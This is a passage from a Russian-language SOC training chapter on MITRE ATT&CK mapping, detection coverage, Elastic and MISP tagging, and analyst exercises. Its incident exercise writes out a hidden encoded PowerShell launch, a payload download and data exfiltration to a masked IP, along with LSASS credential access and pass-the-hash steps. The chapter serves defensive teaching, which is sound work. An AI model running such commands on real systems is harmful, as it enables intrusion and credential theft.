            "lateral_movement": [],
            "collection": [],
            "command_control": [],
            "exfiltration": [],
            "impact": [],
        }
        
        for obs in observations:
            technique = self.map_to_attack(obs["description"])
            tactic = self.get_tactic_for_technique(technique)
            if tactic in chain:
                chain[tactic].append({
                    "time": obs["timestamp"],
                    "technique": technique,
                    "observation": obs["description"]
                })
        
        return chain
    
    def generate_report_section(self, chain: dict) -> str:
        """Генерация секции отчёта с ATT&CK mapping"""
        report = "## ATT&CK Techniques Observed\n\n"
        
        for tactic, techniques in chain.items():
            if techniques:
                report += f"### {tactic.replace('_', ' ').title()}\n"
                for t in techniques:
                    report += f"- **{t['technique']}**: {t['observation']}\n"
                report += "\n"
        
        return report
    
    def get_tactic_for_technique(self, technique_id: str) -> str:
        """Упрощённый маппинг техники на тактику"""
        tactic_map = {
            "T1059": "execution",
            "T1003": "credential_access",
            "T1543": "persistence",
            "T1053": "persistence",
            "T1547": "persistence",
            "T1021": "lateral_movement",
            "T1550": "lateral_movement",
            "T1071": "command_control",
            "T1566": "initial_access",
        }
        prefix = technique_id.split(".")[0]
        return tactic_map.get(prefix, "unknown")
```

### Использование ATT&CK для Gap Analysis

```
Gap Analysis: что мы не детектируем?

1. Взять список техник из ATT&CK Navigator
2. Отметить техники, для которых есть SIEM правила
3. Отметить техники, которые используют целевые APT

Матрица приоритетов:
+------------------+------------------+
|                  |   Есть у APT?   |
|                  |  ДА  |   НЕТ   |
+------------------+------+-----------+
| Есть  | ДА       |  ✓   |    ~    |
| детек-| НЕТ      | !!!  |    -    |
| ция?  |          |      |         |
+------------------+------+-----------+

!!! = КРИТИЧЕСКИЙ ГАП (нет детекции, но APT использует)
✓   = Хорошо (есть детекция, APT использует)
~   = Избыточно? (есть детекция, APT не использует)
-   = Нет приоритета
```

### ATT&CK для разработки правил детекции

```bash
# Workflow разработки детекции:
# 1. Выбрать технику (например T1021.001 - RDP)
# 2. Изучить страницу на attack.mitre.org:
#    - Примеры использования APT
#    - Ссылки на отчёты
#    - Предложенные детекции
#    - Mitigation контролы
# 3. Найти соответствующие Sigma правила:
#    https://github.com/SigmaHQ/sigma

# Поиск Sigma правил по ATT&CK ID:
grep -r "T1021.001" /path/to/sigma/rules/

# 4. Адаптировать под вашу среду
# 5. Протестировать с Atomic Red Team:
Invoke-AtomicTest T1021.001

# 6. Задокументировать покрытие в Navigator
```

---

## 5.2.12 Интеграция ATT&CK с инструментами SOC

### Elastic SIEM и ATT&CK

```
Elastic Security встроенная интеграция:
- Каждое правило детекции содержит ATT&CK теги
- Дашборд показывает покрытие матрицы
- Алерты автоматически группируются по тактикам

Пример Elastic правила:
{
  "name": "Credential Dumping - LSASS Memory",
  "tags": ["attack.credential_access", "attack.t1003.001"],
  "threat": [{
    "framework": "MITRE ATT&CK",
    "tactic": {
      "id": "TA0006",
      "name": "Credential Access",
      "reference": "https://attack.mitre.org/tactics/TA0006/"
    },
    "technique": [{
      "id": "T1003",
      "name": "OS Credential Dumping",
      "reference": "https://attack.mitre.org/techniques/T1003/",
      "subtechnique": [{
        "id": "T1003.001",
        "name": "LSASS Memory"
      }]
    }]
  }]
}
```

### MISP и ATT&CK

```python
# Пример: добавление ATT&CK тегов к IOC в MISP
import pymisp
from pymisp import PyMISP, MISPEvent, MISPAttribute

def tag_ioc_with_attack(misp_url: str, misp_key: str, 
                         event_id: int, attribute_uuid: str,
                         technique_id: str) -> bool:
    """
    Тегирование IOC в MISP с ATT&CK техникой
    """
    misp = PyMISP(misp_url, misp_key, False)
    
    # ATT&CK теги в MISP имеют формат:
    # misp-galaxy:mitre-attack-pattern="Technique Name - T1234"
    
    tag_name = f"misp-galaxy:mitre-attack-pattern=\"{technique_id}\""
    
    result = misp.tag(attribute_uuid, tag_name)
    return result.get("saved", False)
```

---

## 5.2.13 Практические упражнения

### Упражнение 1: Mapping инцидента (30 минут)

**Сценарий:** Ниже описан инцидент. Ваша задача — сопоставить каждое событие с ATT&CK техникой.

```
Timeline инцидента "Operation RedDoor":

12:35 - Пользователь john.doe@company.com получил письмо
        от "IT-отдела" с вложением "IT_Security_Update.docx"
        (SPF: fail, DKIM: fail)

12:37 - john.doe открыл документ, нажал "Enable Content"

12:37 - winword.exe запустил cmd.exe с параметрами:
        cmd.exe /c powershell.exe -nop -w hidden 
        -enc [base64-encoded-string]

12:38 - PowerShell загрузил файл с 185.234.x.x:
        C:\Users\john\AppData\Local\Temp\update.exe

12:39 - update.exe создан в системе и запущен

12:39 - Создан ключ реестра:
        HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        "Updater" = "C:\Users\john\AppData\Local\update.exe"

12:45 - HTTPS соединения к 185.234.x.x каждые 300 секунд

13:10 - update.exe обратился к памяти процесса lsass.exe
        GrantedAccess: 0x1010

13:15 - Аутентификация на \\FILESERVER01 
        от john.doe (NT hash, no password)

13:20 - Создана копия \\FILESERVER01\Finance\ в %TEMP%\data\

13:35 - Данные отправлены POST-запросом на 185.234.x.x
```

**Задание:** Для каждого события укажите ATT&CK технику и тактику.

**Ответы (сверьтесь после выполнения):**

```
12:35 → T1566.001 (Spearphishing Attachment) - Initial Access
12:37 → T1204.002 (Malicious File) - Execution
12:37 → T1059.003 + T1059.001 (Cmd + PowerShell) - Execution
12:37 → T1027 (Obfuscated Files - base64) - Defense Evasion
12:38 → T1105 (Ingress Tool Transfer) - Command and Control
12:39 → T1547.001 (Registry Run Keys) - Persistence
12:45 → T1071.001 (Web Protocols) - Command and Control
        T1573.002 (Asymmetric Cryptography - HTTPS) - C2
13:10 → T1003.001 (LSASS Memory) - Credential Access
13:15 → T1550.002 (Pass the Hash) - Lateral Movement
        T1021.002 (SMB/Windows Admin Shares) - Lateral Movement
13:20 → T1039 (Data from Network Shared Drive) - Collection
13:35 → T1041 (Exfiltration Over C2 Channel) - Exfiltration
```

---

### Упражнение 2: Создание покрытия в Navigator (45 минут)

```
Задание:
1. Открыть https://mitre-attack.github.io/attack-navigator/
2. Создать новый слой "My SOC Coverage"
3. Отметить зелёным (покрыто детекцией) следующие техники:
   - T1566.001 (есть Email Gateway)
   - T1059.001 (есть PowerShell logging)
   - T1003.001 (есть Sysmon + правило)
   - T1547.001 (есть мониторинг реестра)

4. Отметить жёлтым (частично покрыто):
   - T1021.001 (RDP логируется, но нет baseline)
   - T1071.001 (прокси есть, но нет ML-анализа)

5. Сохранить как JSON и загрузить на следующей неделе
   для сравнения прогресса.
```

---

### Упражнение 3: Python скрипт для ATT&CK lookup (60 минут)

```python
#!/usr/bin/env python3
"""
ATT&CK Technique Lookup Tool
Задание: доработать скрипт для полноценного поиска
"""
import json
import urllib.request

def download_attack_data(domain: str = "enterprise-attack") -> dict:
    """Скачивание актуальных данных ATT&CK через STIX"""
    url = f"https://raw.githubusercontent.com/mitre/cti/master/{domain}/{domain}.json"
    
    print(f"[*] Downloading ATT&CK data for {domain}...")
    with urllib.request.urlopen(url) as response:
        data = json.loads(response.read().decode())
    
    return data

def parse_techniques(stix_data: dict) -> dict:
    """Парсинг техник из STIX данных"""
    techniques = {}
    
    for obj in stix_data.get("objects", []):
        if obj.get("type") != "attack-pattern":
            continue
        if obj.get("x_mitre_deprecated", False):
            continue
        
        # Получение ATT&CK ID
        attack_id = None
        for ref in obj.get("external_references", []):
            if ref.get("source_name") == "mitre-attack":
                attack_id = ref.get("external_id")
                break
        
        if not attack_id:
            continue
        
        # Получение тактик
        tactics = [
            phase.get("phase_name", "")
            for phase in obj.get("kill_chain_phases", [])
            if phase.get("kill_chain_name") == "mitre-attack"
        ]
        
        techniques[attack_id] = {
            "id": attack_id,
            "name": obj.get("name", "Unknown"),
            "tactics": tactics,
            "description": obj.get("description", "")[:300],
            "platforms": obj.get("x_mitre_platforms", []),
            "is_subtechnique": "." in attack_id,
        }
    
    return techniques

def lookup_technique(techniques: dict, query: str) -> list:
    """Поиск техники по ID или ключевому слову"""
    results = []
    query_lower = query.lower()
    
    for tech_id, tech_data in techniques.items():
        # Поиск по ID
        if query_lower in tech_id.lower():
            results.append(tech_data)
            continue
        # Поиск по названию
        if query_lower in tech_data["name"].lower():
            results.append(tech_data)
            continue
        # Поиск по описанию
        if query_lower in tech_data["description"].lower():
            results.append(tech_data)
    
    return results

def print_technique(tech: dict) -> None:
    """Форматированный вывод техники"""
    print(f"\n{'='*60}")
    print(f"ID:       {tech['id']}")
    print(f"Name:     {tech['name']}")
    print(f"Tactics:  {', '.join(tech['tactics'])}")
    print(f"Platforms: {', '.join(tech['platforms'])}")
    print(f"{'='*60}")
    print(f"Description: {tech['description'][:200]}...")

def main():
    import sys
    
    # Скачать данные (или загрузить из кэша)
    cache_file = "/tmp/attack_data.json"
    
    try:
        with open(cache_file) as f:
            stix_data = json.load(f)
        print("[*] Using cached ATT&CK data")
    except FileNotFoundError:
        stix_data = download_attack_data()
        with open(cache_file, "w") as f:
            json.dump(stix_data, f)
    
    techniques = parse_techniques(stix_data)
    print(f"[+] Loaded {len(techniques)} techniques")
    
    # Интерактивный поиск
    while True:
        query = input("\nEnter technique ID or keyword (q to quit): ").strip()
        if query.lower() == "q":
            break
        
        results = lookup_technique(techniques, query)
        
        if not results:
            print("[-] No techniques found")
        else:
            print(f"[+] Found {len(results)} technique(s):")
            for tech in results[:5]:  # Показать первые 5
                print_technique(tech)

if __name__ == "__main__":
    main()

# ЗАДАНИЕ для самостоятельной работы:
# 1. Добавить фильтрацию по платформе (--platform windows)
# 2. Добавить фильтрацию по тактике (--tactic persistence)
# 3. Добавить экспорт в CSV
# 4. Добавить получение связанных APT-групп для техники
```

---

### Упражнение 4: APT Research (2 часа)

```
Задание: Исследование APT-группы через ATT&CK

1. Выберите одну из APT-групп:
   - APT29 (Cozy Bear)
   - APT28 (Fancy Bear)  
   - Lazarus Group
   - FIN7

2. Перейдите на https://attack.mitre.org/groups/

3. Найдите вашу группу и изучите:
   - Какие страны атакуют?
   - Какие сектора?
   - Какие техники используют (ТОП-10)?

4. Создайте слой в ATT&CK Navigator:
   - Отметьте красным все техники группы
   - Отметьте зелёным техники, для которых у вас есть детекции

5. Напишите короткий (500 слов) threat profile:
   - Кто эта группа?
   - Их мотивация
   - Их top TTPs
   - Как защититься именно от этой группы?
```

---

## 📚 Ключевые ресурсы

| Ресурс | URL | Описание |
|--------|-----|----------|
| ATT&CK website | attack.mitre.org | Основная база знаний |
| ATT&CK Navigator | mitre-attack.github.io/attack-navigator | Визуализация |
| Atomic Red Team | github.com/redcanaryco/atomic-red-team | Тесты детекций |
| Sigma Rules | github.com/SigmaHQ/sigma | Правила детекции |
| MITRE ATT&CK API | github.com/mitre-attack/mitreattack-python | Python библиотека |
| CTI blueprints | github.com/center-for-threat-informed-defense | Шаблоны |

## 🔑 Ключевые понятия

| Термин | Определение |
|--------|-------------|
| TTP | Tactics, Techniques, Procedures |
| Tactic | ЗАЧЕМ? Цель атакующего |
| Technique | КАК? Метод достижения цели |
| Sub-technique | КАК ИМЕННО? Детализированный метод |
| Procedure | Конкретная реализация (инструмент, командная строка) |
| ATT&CK ID | Уникальный идентификатор техники (T1059.001) |
| STIX | Structured Threat Information eXpression |
| Mapping | Сопоставление наблюдений с ATT&CK |

---

## ✅ Итоги главы

После этой главы вы умеете:

- [x] Объяснить все 7 этапов Cyber Kill Chain с реальными примерами
- [x] Ориентироваться в MITRE ATT&CK: тактики, техники, подтехники
- [x] Использовать ATT&CK Navigator для визуализации coverage
- [x] Сопоставлять события из логов с ATT&CK техниками (mapping)
- [x] Исследовать профили APT-группировок через ATT&CK
- [x] Использовать ATT&CK в ежедневной работе SOC-аналитика
- [x] Писать Python-скрипты для работы с ATT&CK данными

**Следующая глава:** 5.3 — Threat Intelligence и управление IOC

